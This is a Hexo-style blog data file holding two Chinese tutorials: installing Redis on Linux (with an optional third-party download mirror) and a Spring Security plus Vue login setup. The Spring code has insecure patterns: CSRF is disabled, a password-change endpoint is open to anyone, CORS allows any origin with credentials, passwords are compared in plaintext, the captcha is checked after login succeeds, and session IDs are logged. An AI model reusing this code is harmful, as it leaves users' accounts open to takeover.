&& tar -zxvf redis-stable.tar.gz -C /usr/local/redis/\n```\n\n### 安装redis\n\n```shell\nmkdir /usr/local/redis/ && tar -zxvf redis-stable.tar.gz -C /usr/local/redis/\n```\n\n> 编译redis\n\n```shell\nmake distclean && make # 清除之前的编译缓存再次编译\n```\n\n> 安装\n\n```shell\nmake PREFIX=/usr/local/redis install # PREFIX不指定的话默认将命令安装到/usr/local/bin\n```\n\n> 配置环境变量\n\n```shell\nexport PATH=$PATH:/usr/local/redis/bin\n```\n\n> 复制配置文件\n\n```shell\ncp /usr/local/redis/redis-stable/redis.conf /etc/redis\n```\n\n","source":"_posts/Linux安装redis.md","raw":"---\ntitle: Linux安装redis\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-05-10 06:35:04\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: Linux Install Redis\ntags: redis\ncategories: Linux\n---\n\n## Linux Install Redis\n### GET REDIS\n> 下载稳定版Redis\n\n```shell\n# 官网\nwget https://download.redis.io/redis-stable.tar.gz\n# 或者\nwget http://nobibibi.top/somg/file/redis/linux/redis-stable.tar.gz\n```\n\n> 解压Redis到`/usr/local/redis/`\n\n```shell\nmkdir /usr/local/redis/ && tar -zxvf redis-stable.tar.gz -C /usr/local/redis/\n```\n\n### 安装redis\n\n```shell\nmkdir /usr/local/redis/ && tar -zxvf redis-stable.tar.gz -C /usr/local/redis/\n```\n\n> 编译redis\n\n```shell\nmake distclean && make # 清除之前的编译缓存再次编译\n```\n\n> 安装\n\n```shell\nmake PREFIX=/usr/local/redis install # PREFIX不指定的话默认将命令安装到/usr/local/bin\n```\n\n> 配置环境变量\n\n```shell\nexport PATH=$PATH:/usr/local/redis/bin\n```\n\n> 复制配置文件\n\n```shell\ncp /usr/local/redis/redis-stable/redis.conf /etc/redis\n```\n\n","slug":"Linux安装redis","published":1,"updated":"2023-05-19T05:53:37.789Z","_id":"clhgy9swf00070gvg7b111qv9","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"Linux-Install-Redis\"><a href=\"#Linux-Install-Redis\" class=\"headerlink\" title=\"Linux Install Redis\"></a>Linux Install Redis</h2><h3 id=\"GET-REDIS\"><a href=\"#GET-REDIS\" class=\"headerlink\" title=\"GET REDIS\"></a>GET REDIS</h3><blockquote>\n<p>下载稳定版Redis</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 官网</span>\n<span class=\"token function\">wget</span> https://download.redis.io/redis-stable.tar.gz\n<span class=\"token comment\"># 或者</span>\n<span class=\"token function\">wget</span> http://nobibibi.top/somg/file/redis/linux/redis-stable.tar.gz<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>解压Redis到<code>/usr/local/redis/</code></p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">mkdir</span> /usr/local/redis/ <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> redis-stable.tar.gz <span class=\"token parameter variable\">-C</span> /usr/local/redis/<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"安装redis\"><a href=\"#安装redis\" class=\"headerlink\" title=\"安装redis\"></a>安装redis</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">mkdir</span> /usr/local/redis/ <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> redis-stable.tar.gz <span class=\"token parameter variable\">-C</span> /usr/local/redis/<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>编译redis</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">make</span> distclean <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">make</span> <span class=\"token comment\"># 清除之前的编译缓存再次编译</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>安装</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">make</span> <span class=\"token assign-left variable\">PREFIX</span><span class=\"token operator\">=</span>/usr/local/redis <span class=\"token function\">install</span> <span class=\"token comment\"># PREFIX不指定的话默认将命令安装到/usr/local/bin</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>配置环境变量</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span><span class=\"token environment constant\">$PATH</span>:/usr/local/redis/bin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>复制配置文件</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">cp</span> /usr/local/redis/redis-stable/redis.conf /etc/redis<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Linux-Install-Redis\"><a href=\"#Linux-Install-Redis\" class=\"headerlink\" title=\"Linux Install Redis\"></a>Linux Install Redis</h2><h3 id=\"GET-REDIS\"><a href=\"#GET-REDIS\" class=\"headerlink\" title=\"GET REDIS\"></a>GET REDIS</h3><blockquote>\n<p>下载稳定版Redis</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 官网</span>\n<span class=\"token function\">wget</span> https://download.redis.io/redis-stable.tar.gz\n<span class=\"token comment\"># 或者</span>\n<span class=\"token function\">wget</span> http://nobibibi.top/somg/file/redis/linux/redis-stable.tar.gz<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>解压Redis到<code>/usr/local/redis/</code></p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">mkdir</span> /usr/local/redis/ <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> redis-stable.tar.gz <span class=\"token parameter variable\">-C</span> /usr/local/redis/<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"安装redis\"><a href=\"#安装redis\" class=\"headerlink\" title=\"安装redis\"></a>安装redis</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">mkdir</span> /usr/local/redis/ <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> redis-stable.tar.gz <span class=\"token parameter variable\">-C</span> /usr/local/redis/<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>编译redis</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">make</span> distclean <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">make</span> <span class=\"token comment\"># 清除之前的编译缓存再次编译</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>安装</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">make</span> <span class=\"token assign-left variable\">PREFIX</span><span class=\"token operator\">=</span>/usr/local/redis <span class=\"token function\">install</span> <span class=\"token comment\"># PREFIX不指定的话默认将命令安装到/usr/local/bin</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>配置环境变量</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span><span class=\"token environment constant\">$PATH</span>:/usr/local/redis/bin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>复制配置文件</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">cp</span> /usr/local/redis/redis-stable/redis.conf /etc/redis<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n"},{"title":"SpringSecurity+vue前后端分离","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-03-17T08:09:59.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"SpringSecurity+vue前后端分离","_content":"适合单体架构\n\n## 基本搭建\n\n创建SpringBoot项目并且导入SpringSecurity依赖\n\n```pom\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-security</artifactId>\n    <version>2.6.8</version>\n</dependency>\n```\n\n导入图形验证码依赖\n\n```pom\n<dependency>\n    <groupId>com.github.whvcse</groupId>\n    <artifactId>easy-captcha</artifactId>\n    <version>1.6.2</version>\n</dependency>\n```\n\n\n### 创建配置类\n```java\n@Configuration\npublic class SecurityConfigurerAdapter extends WebSecurityConfigurerAdapter {\n    @Override\n    protected void configure(HttpSecurity http) throws Exception {\n        http.csrf().disable();\n\n        http.cors(Customizer.withDefaults());\n\n        //解决跨域问题。cors 预检请求放行,让Spring security 放行所有preflight request（cors 预检请求）\n        http.authorizeRequests().requestMatchers(CorsUtils::isPreFlightRequest).permitAll();\n\n        http.formLogin()\n\n                .failureHandler(new LoginFailHandler())\n\n                .successHandler(new LoginSuccessHandler())\n\n                .loginProcessingUrl(\"/user/login\");\n\n        http.authorizeRequests()\n\n                .antMatchers(\"/user/captcha\", \"/user/register\", \"/user/alterPwd\").permitAll()\n\n                .anyRequest().authenticated();\n\n        http.exceptionHandling() // 自定义权限受限403处理\n\n                .accessDeniedHandler(new MyAccessDeniedHandler()); // 处理器模式，自由度更广\n\n        // .accessDeniedPage(\"/forbidden.html\"); // 直接返回一个页面。不和上面的同时使用\n        \n        http.logout().logoutUrl(\"/user/logout\");\n    }\n    \n}\n```\n\n### 实现登录逻辑\n创建登录逻辑类并实现UserDetailService,重写他的loadUserByUsername方法\n```java\n@Service\npublic class UserServiceImpl extends ServiceImpl<UserMapper, User> implements UserService, UserDetailsService {\n\n    @Autowired\n    private UserRoleService userRoleService;\n    @Autowired\n    private RoleService roleService;\n    @Autowired\n    BCryptPasswordEncoder passwordEncoder;\n    @Autowired\n    private PermissionService permissionService;\n    @Autowired\n    private UserPermissionService userPermissionService;\n\n    @Override\n    public R getUser(User user, HttpServletRequest request) throws Exception {\n\n        User querUser = this.baseMapper.selectByUserName(user.getUsername());\n\n        if (user == null){\n\n            return R.error(REnum.USER_DOES_NOT_EXIST.getStatusCode(),\n                    REnum.USER_DOES_NOT_EXIST.getStatusMsg());\n\n        } else if (!querUser.getPassword().equals(user.getPassword())) {\n\n            return R.error(REnum.USER_PASSWORD_ERROR.getStatusCode(),\n                    REnum.USER_PASSWORD_ERROR.getStatusMsg());\n\n        }\n        request.getSession().setAttribute(\"user\", querUser);\n\n        return R.ok(REnum.LOGIN_SUCCESS.getStatusCode(),\n                REnum.LOGIN_SUCCESS.getStatusMsg());\n    }\n\n    @Override\n    public List<User> getUserList() {\n\n        List<User> userList = this.baseMapper.selectList(null);\n\n        return userList;\n    }\n\n    @Override\n    public PageUtils getUserPage(Map<String, Object> params) {\n\n        IPage<User> page = this.page(new QueryPage<User>().getPage(params, true),\n                new LambdaQueryWrapper<User>().like(User::getUsername,\n                        (String) params.get(\"username\")));\n\n        return new  PageUtils(page);\n\n    }\n\n    @Override\n    public R addUser(User user) {\n\n        User queryUser = this.baseMapper.getUserByUserName(user.getUsername());\n\n        if (queryUser != null){\n\n            return R.error(REnum.USER_DOES_EXIST.getStatusCode(),\n                    REnum.USER_DOES_EXIST.getStatusMsg());\n\n        }\n\n        String password = user.getPassword();\n\n        String encodePassword = passwordEncoder.encode(password);\n\n        user.setPassword(encodePassword);\n\n        this.baseMapper.insert(user);\n\n        return R.ok(REnum.REGISTER_SUCCESS.getStatusCode(),\n                REnum.REGISTER_SUCCESS.getStatusMsg());\n\n    }\n\n    @Override\n    public void editUser(User user) {\n\n        this.baseMapper.updateById(user);\n\n    }\n\n    @Override\n    public void deleteUserById(Long id) {\n\n        this.baseMapper.deleteById(id);\n\n    }\n\n    @Override\n    @Transactional\n    public R alterPwdByUserName(User user) {\n\n        User userByUserName = this.baseMapper.getUserByUserName(user.getUsername());\n\n        if(userByUserName == null){\n\n            return R.error(REnum.USER_DOES_NOT_EXIST.getStatusCode(),\n                    REnum.USER_DOES_NOT_EXIST.getStatusMsg());\n\n        }\n\n        String password = user.getPassword();\n\n        String encodePassword = passwordEncoder.encode(password);\n\n        user.setPassword(encodePassword);\n\n        this.baseMapper.alterPwdByUserName(user);\n\n        return R.ok(REnum.ALTER_PASSWORD_SUCCESS.getStatusCode(),\n                REnum.ALTER_PASSWORD_SUCCESS.getStatusMsg());\n    }\n\n    @Override\n    public User selectUserByName(String username) {\n\n        User user = this.baseMapper.getUserByUserName(username);\n\n        return user;\n\n    }\n\n\n    // 登录逻辑\n    @Override\n    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n\n        List<SimpleGrantedAuthority> simpleGrantedAuthorities = new ArrayList<>();\n\n        System.out.println(username);\n\n        try {\n\n            User user = this.baseMapper.getUserByUserName(username);\n            // System.out.println(user);\n\n            if (user != null) {\n\n                List<Long> roleIdList = userRoleService.selectByUserId(user.getId());\n\n                for (Long roleId : roleIdList) {\n\n                    Role role = roleService.getById(roleId);\n\n                    simpleGrantedAuthorities.add(new SimpleGrantedAuthority(\"ROLE_\" + role.getRoleName()));\n\n                }\n\n                List<Long> permissionIdList = userPermissionService.selectByUserId(user.getId());\n\n                for (Long permissionId : permissionIdList) {\n\n                    Permission permission = permissionService.getById(permissionId);\n\n                    simpleGrantedAuthorities.add(new SimpleGrantedAuthority(permission.getPermissionName()));\n\n                }\n\n\n            }\n\n            return new MyUser(username, user.getPassword(), simpleGrantedAuthorities);\n\n        }catch (Exception e){\n\n            e.printStackTrace();\n\n            return new MyUser(username, \"\", simpleGrantedAuthorities);\n        }\n    }\n}\n```\n\n### 创建自己的User认证类\n实现UserDetial接口\n```java\npublic class MyUser implements UserDetails {\n    private String username;\n    private String password;\n    private Collection<? extends GrantedAuthority> grantedAuthorities;\n\n    public MyUser(String username, String password, Collection<? extends GrantedAuthority> grantedAuthorities) {\n        this.username = username;\n        this.password = password;\n        this.grantedAuthorities = grantedAuthorities;\n    }\n\n    @Override\n    public Collection<? extends GrantedAuthority> getAuthorities() {\n        return this.grantedAuthorities;\n    }\n\n    @Override\n    public String getPassword() {\n        return this.password;\n    }\n\n    @Override\n    public String getUsername() {\n        return this.username;\n    }\n\n    @Override\n    public boolean isAccountNonExpired() {\n        return true;\n    }\n\n    @Override\n    public boolean isAccountNonLocked() {\n        return true;\n    }\n\n    @Override\n    public boolean isCredentialsNonExpired() {\n        return true;\n    }\n\n    @Override\n    public boolean isEnabled() {\n        return true;\n    }\n}\n```\n\n### 添加处理器\n\n#### 登录成功处理器\n```java\npublic class LoginSuccessHandler implements AuthenticationSuccessHandler {\n\n    // private String url;\n\n    // public LoginSuccessHandler(String url){\n    //     this.url = url;\n    // }\n\n    @Override\n    public void onAuthenticationSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException {\n\n        // 获取客户端ip\n        // System.out.println(request.getRemoteAddr());\n\n        // 获取SpringSecurity里面的User对象\n        // User user = (User) authentication.getPrincipal();\n        // 获取权限列表\n        // System.out.println(user.getAuthorities());\n        //  获取用户名\n        // System.out.println(user.getUsername());\n        // 获取用户密码，null，为了安全\n        // System.out.println(user.getPassword());\n        // response.sendRedirect(this.url);\n\n        response.setContentType(\"application/json;charset=utf-8\");\n\n        response.setStatus(HttpServletResponse.SC_OK);\n\n        PrintWriter writer = response.getWriter();\n\n        String code = (String) request.getSession().getAttribute(\"code\");\n\n        System.out.println(code);\n        HttpSession session = request.getSession();\n        String id = session.getId();\n        System.out.println(id);\n\n\n        if (code.toLowerCase().equals((String) request.getParameter(\"code\").toLowerCase())){\n            // Authentication authentication = SecurityContextHolder.getContext().getAuthentication();\n            // System.out.println(authentication.getPrincipal());\n\n            MyUser principal = (MyUser) SecurityContextHolder.getContext()\n                    .getAuthentication()\n                    .getPrincipal();\n\n            User user = new User();\n\n            BeanUtils.copyProperties(principal, user);\n\n            request.getSession().setAttribute(\"user\", user);\n\n            writer.write(JSON.toJSONString(R\n                    .ok(REnum.LOGIN_SUCCESS.getStatusCode(),\n                    REnum.LOGIN_SUCCESS.getStatusMsg())));\n\n        }else {\n\n            writer.write(JSON.toJSONString(R.error(REnum.VALIDATE_CODE_ERROR.getStatusCode(),\n                    REnum.VALIDATE_CODE_ERROR.getStatusMsg())));\n        }\n\n        writer.flush();\n\n    }\n}\n```\n\n#### 登录失败处理器\n```java\npublic class LoginFailHandler implements AuthenticationFailureHandler {\n\n    @Override\n    public void onAuthenticationFailure(HttpServletRequest request, HttpServletResponse response, AuthenticationException exception) throws IOException, ServletException {\n\n        response.setContentType(\"application/json;charset=utf-8\");\n\n        response.setStatus(HttpServletResponse.SC_OK);\n\n        PrintWriter writer = response.getWriter();\n\n        String code = (String) request.getSession().getAttribute(\"code\");\n\n        writer.write(JSON.toJSONString(R.ok(REnum.LOGIN_FAIL.getStatusCode(),\n                REnum.LOGIN_FAIL.getStatusMsg())));\n\n        writer.flush();\n\n    }\n}\n```\n\n#### 登出成功处理器\n```java\npublic class LogoutSuccessHandler implements org.springframework.security.web.authentication.logout.LogoutSuccessHandler {\n\n\n    @Override\n    public void onLogoutSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException {\n\n        response.setContentType(\"application/json;charset=utf-8\");\n\n        response.setStatus(HttpServletResponse.SC_OK);\n\n        PrintWriter writer = response.getWriter();\n\n        writer.write(JSON.toJSONString(R.ok(REnum.LOGOUT_SUCCESS.getStatusCode(),\n                REnum.LOGOUT_SUCCESS.getStatusMsg())));\n\n        writer.flush();\n    }\n}\n```\n\n#### 403处理器\n```java\npublic class MyAccessDeniedHandler implements AccessDeniedHandler {\n\n\n    @Override\n    public void handle(HttpServletRequest request, HttpServletResponse response, AccessDeniedException accessDeniedException) throws IOException, ServletException {\n\n        response.setContentType(\"application/json;charset=utf-8\");\n\n        response.setStatus(HttpServletResponse.SC_OK);\n\n        PrintWriter writer = response.getWriter();\n\n        writer.write(JSON.toJSONString(R.error(REnum.USER_PERMISSIONS_ERROR.getStatusCode(),\n                REnum.USER_PERMISSIONS_ERROR.getStatusMsg())));\n\n        writer.flush();\n    }\n}\n```\n\n### 跨域\n\n#### 后端\n```java\n@Configuration\npublic class CorsConfig implements WebMvcConfigurer {\n\n    @Override\n    public void addCorsMappings(CorsRegistry registry) {\n        registry.addMapping(\"/**\")\n                .allowedOriginPatterns(\"*\")\n                .allowedMethods(\"GET\", \"HEAD\", \"POST\", \"PUT\", \"DELETE\", \"OPTIONS\")\n                .allowCredentials(true)\n                .maxAge(3600)\n                .allowedHeaders(\"*\");\n    }\n\n}\n```\n\n#### vue(两种方式)\n```shell\naxios.defaults.withCredentials = true # main.js\t\n```\n\n```shell\n# 创建axios实例\nvar instance =  axios.create({\n    baseURL: 'http://localhost:8888/', # 添加基本地址\n    timeout: 1000, # 所有请求在超时前等待1秒\n    withCredentials: true # 请求的时候携带cookie\n})\n```\n\n\n\n\n\n\n\n","source":"_posts/SpringSecurity-vue前后端分离.md","raw":"---\ntitle: SpringSecurity+vue前后端分离\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-03-17 16:09:59\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: SpringSecurity+vue前后端分离\ntags: spring-security\ncategories: spring\n---\n适合单体架构\n\n## 基本搭建\n\n创建SpringBoot项目并且导入SpringSecurity依赖\n\n```pom\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-security</artifactId>\n    <version>2.6.8</version>\n</dependency>\n```\n\n导入图形验证码依赖\n\n```pom\n<dependency>\n    <groupId>com.github.whvcse</groupId>\n    <artifactId>easy-captcha</artifactId>\n    <version>1.6.2</version>\n</dependency>\n```\n\n\n### 创建配置类\n```java\n@Configuration\npublic class SecurityConfigurerAdapter extends WebSecurityConfigurerAdapter {\n    @Override\n    protected void configure(HttpSecurity http) throws Exception {\n        http.csrf().disable();\n\n        http.cors(Customizer.withDefaults());\n\n        //解决跨域问题。cors 预检请求放行,让Spring security 放行所有preflight request（cors 预检请求）\n        http.authorizeRequests().requestMatchers(CorsUtils::isPreFlightRequest).permitAll();\n\n        http.formLogin()\n\n                .failureHandler(new LoginFailHandler())\n\n                .successHandler(new LoginSuccessHandler())\n\n                .loginProcessingUrl(\"/user/login\");\n\n        http.authorizeRequests()\n\n                .antMatchers(\"/user/captcha\", \"/user/register\", \"/user/alterPwd\").permitAll()\n\n                .anyRequest().authenticated();\n\n        http.exceptionHandling() // 自定义权限受限403处理\n\n                .accessDeniedHandler(new MyAccessDeniedHandler()); // 处理器模式，自由度更广\n\n        // .accessDeniedPage(\"/forbidden.html\"); // 直接返回一个页面。不和上面的同时使用\n        \n        http.logout().logoutUrl(\"/user/logout\");\n    }\n    \n}\n```\n\n### 实现登录逻辑\n创建登录逻辑类并实现UserDetailService,重写他的loadUserByUsername方法\n```java\n@Service\npublic class UserServiceImpl extends ServiceImpl<UserMapper, User> implements UserService, UserDetailsService {\n\n    @Autowired\n    private UserRoleService userRoleService;\n    @Autowired\n    private RoleService roleService;\n    @Autowired\n    BCryptPasswordEncoder passwordEncoder;\n    @Autowired\n    private PermissionService permissionService;\n    @Autowired\n    private UserPermissionService userPermissionService;\n\n    @Override\n    public R getUser(User user, HttpServletRequest request) throws Exception {\n\n        User querUser = this.baseMapper.selectByUserName(user.getUsername());\n\n        if (user == null){\n\n            return R.error(REnum.USER_DOES_NOT_EXIST.getStatusCode(),\n                    REnum.USER_DOES_NOT_EXIST.getStatusMsg());\n\n        } else if (!querUser.getPassword().equals(user.getPassword())) {\n\n            return R.error(REnum.USER_PASSWORD_ERROR.getStatusCode(),\n                    REnum.USER_PASSWORD_ERROR.getStatusMsg());\n\n        }\n        request.getSession().setAttribute(\"user\", querUser);\n\n        return R.ok(REnum.LOGIN_SUCCESS.getStatusCode(),\n                REnum.LOGIN_SUCCESS.getStatusMsg());\n    }\n\n    @Override\n    public List<User> getUserList() {\n\n        List<User> userList = this.baseMapper.selectList(null);\n\n        return userList;\n    }\n\n    @Override\n    public PageUtils getUserPage(Map<String, Object> params) {\n\n        IPage<User> page = this.page(new QueryPage<User>().getPage(params, true),\n                new LambdaQueryWrapper<User>().like(User::getUsername,\n                        (String) params.get(\"username\")));\n\n        return new  PageUtils(page);\n\n    }\n\n    @Override\n    public R addUser(User user) {\n\n        User queryUser = this.baseMapper.getUserByUserName(user.getUsername());\n\n        if (queryUser != null){\n\n            return R.error(REnum.USER_DOES_EXIST.getStatusCode(),\n                    REnum.USER_DOES_EXIST.getStatusMsg());\n\n        }\n\n        String password = user.getPassword();\n\n        String encodePassword = passwordEncoder.encode(password);\n\n        user.setPassword(encodePassword);\n\n        this.baseMapper.insert(user);\n\n        return R.ok(REnum.REGISTER_SUCCESS.getStatusCode(),\n                REnum.REGISTER_SUCCESS.getStatusMsg());\n\n    }\n\n    @Override\n    public void editUser(User user) {\n\n        this.baseMapper.updateById(user);\n\n    }\n\n    @Override\n    public void deleteUserById(Long id) {\n\n        this.baseMapper.deleteById(id);\n\n    }\n\n    @Override\n    @Transactional\n    public R alterPwdByUserName(User user) {\n\n        User userByUserName = this.baseMapper.getUserByUserName(user.getUsername());\n\n        if(userByUserName == null){\n\n            return R.error(REnum.USER_DOES_NOT_EXIST.getStatusCode(),\n                    REnum.USER_DOES_NOT_EXIST.getStatusMsg());\n\n        }\n\n        String password = user.getPassword();\n\n        String encodePassword = passwordEncoder.encode(password);\n\n        user.setPassword(encodePassword);\n\n        this.baseMapper.alterPwdByUserName(user);\n\n        return R.ok(REnum.ALTER_PASSWORD_SUCCESS.getStatusCode(),\n                REnum.ALTER_PASSWORD_SUCCESS.getStatusMsg());\n    }\n\n    @Override\n    public User selectUserByName(String username) {\n\n        User user = this.baseMapper.getUserByUserName(username);\n\n        return user;\n\n    }\n\n\n    // 登录逻辑\n    @Override\n    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n\n        List<SimpleGrantedAuthority> simpleGrantedAuthorities = new ArrayList<>();\n\n        System.out.println(username);\n\n        try {\n\n            User user = this.baseMapper.getUserByUserName(username);\n            // System.out.println(user);\n\n            if (user != null) {\n\n                List<Long> roleIdList = userRoleService.selectByUserId(user.getId());\n\n                for (Long roleId : roleIdList) {\n\n                    Role role = roleService.getById(roleId);\n\n                    simpleGrantedAuthorities.add(new SimpleGrantedAuthority(\"ROLE_\" + role.getRoleName()));\n\n                }\n\n                List<Long> permissionIdList = userPermissionService.selectByUserId(user.getId());\n\n                for (Long permissionId : permissionIdList) {\n\n                    Permission permission = permissionService.getById(permissionId);\n\n                    simpleGrantedAuthorities.add(new SimpleGrantedAuthority(permission.getPermissionName()));\n\n                }\n\n\n            }\n\n            return new MyUser(username, user.getPassword(), simpleGrantedAuthorities);\n\n        }catch (Exception e){\n\n            e.printStackTrace();\n\n            return new MyUser(username, \"\", simpleGrantedAuthorities);\n        }\n    }\n}\n```\n\n### 创建自己的User认证类\n实现UserDetial接口\n```java\npublic class MyUser implements UserDetails {\n    private String username;\n    private String password;\n    private Collection<? extends GrantedAuthority> grantedAuthorities;\n\n    public MyUser(String username, String password, Collection<? extends GrantedAuthority> grantedAuthorities) {\n        this.username = username;\n        this.password = password;\n        this.grantedAuthorities = grantedAuthorities;\n    }\n\n    @Override\n    public Collection<? extends GrantedAuthority> getAuthorities() {\n        return this.grantedAuthorities;\n    }\n\n    @Override\n    public String getPassword() {\n        return this.password;\n    }\n\n    @Override\n    public String getUsername() {\n        return this.username;\n    }\n\n    @Override\n    public boolean isAccountNonExpired() {\n        return true;\n    }\n\n    @Override\n    public boolean isAccountNonLocked() {\n        return true;\n    }\n\n    @Override\n    public boolean isCredentialsNonExpired() {\n        return true;\n    }\n\n    @Override\n    public boolean isEnabled() {\n        return true;\n    }\n}\n```\n\n### 添加处理器\n\n#### 登录成功处理器\n```java\npublic class LoginSuccessHandler implements AuthenticationSuccessHandler {\n\n    // private String url;\n\n    // public LoginSuccessHandler(String url){\n    //     this.url = url;\n    // }\n\n    @Override\n    public void onAuthenticationSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException {\n\n        // 获取客户端ip\n        // System.out.println(request.getRemoteAddr());\n\n        // 获取SpringSecurity里面的User对象\n        // User user = (User) authentication.getPrincipal();\n        // 获取权限列表\n        // System.out.println(user.getAuthorities());\n        //  获取用户名\n        // System.out.println(user.getUsername());\n        // 获取用户密码，null，为了安全\n        // System.out.println(user.getPassword());\n        // response.sendRedirect(this.url);\n\n        response.setContentType(\"application/json;charset=utf-8\");\n\n        response.setStatus(HttpServletResponse.SC_OK);\n\n        PrintWriter writer = response.getWriter();\n\n        String code = (String) request.getSession().getAttribute(\"code\");\n\n        System.out.println(code);\n        HttpSession session = request.getSession();\n        String id = session.getId();\n        System.out.println(id);\n\n\n        if (code.toLowerCase().equals((String) request.getParameter(\"code\").toLowerCase())){\n            // Authentication authentication = SecurityContextHolder.getContext().getAuthentication();\n            // System.out.println(authentication.getPrincipal());\n\n            MyUser principal = (MyUser) SecurityContextHolder.getContext()\n                    .getAuthentication()\n                    .getPrincipal();\n\n            User user = new User();\n\n            BeanUtils.copyProperties(principal, user);\n\n            request.getSession().setAttribute(\"user\", user);\n\n            writer.write(JSON.toJSONString(R\n                    .ok(REnum.LOGIN_SUCCESS.getStatusCode(),\n                    REnum.LOGIN_SUCCESS.getStatusMsg())));\n\n        }else {\n\n            writer.write(JSON.toJSONString(R.error(REnum.VALIDATE_CODE_ERROR.getStatusCode(),\n                    REnum.VALIDATE_CODE_ERROR.getStatusMsg())));\n        }\n\n        writer.flush();\n\n    }\n}\n```\n\n#### 登录失败处理器\n```java\npublic class LoginFailHandler implements AuthenticationFailureHandler {\n\n    @Override\n    public void onAuthenticationFailure(HttpServletRequest request, HttpServletResponse response, AuthenticationException exception) throws IOException, ServletException {\n\n        response.setContentType(\"application/json;charset=utf-8\");\n\n        response.setStatus(HttpServletResponse.SC_OK);\n\n        PrintWriter writer = response.getWriter();\n\n        String code = (String) request.getSession().getAttribute(\"code\");\n\n        writer.write(JSON.toJSONString(R.ok(REnum.LOGIN_FAIL.getStatusCode(),\n                REnum.LOGIN_FAIL.getStatusMsg())));\n\n        writer.flush();\n\n    }\n}\n```\n\n#### 登出成功处理器\n```java\npublic class LogoutSuccessHandler implements org.springframework.security.web.authentication.logout.LogoutSuccessHandler {\n\n\n    @Override\n    public void onLogoutSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException {\n\n        